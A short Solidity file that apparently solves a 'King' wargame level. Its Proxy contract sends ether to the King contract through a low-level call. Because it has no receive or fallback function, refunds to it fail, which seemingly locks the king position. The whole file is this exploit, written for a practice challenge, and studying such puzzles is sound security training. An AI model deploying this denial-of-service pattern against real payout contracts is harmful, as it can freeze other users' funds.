// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./King.sol";
import "hardhat/console.sol";

contract Proxy {
    address payable kingContractAddress;

    constructor(address payable _kingContractAddress) payable {
        kingContractAddress = _kingContractAddress;
    }

    function attack(uint256 _ammount) public payable {
        (bool sent, bytes memory data) = kingContractAddress.call{
            value: _ammount
        }("");
        require(sent, "cant attack king contract");
    }
}
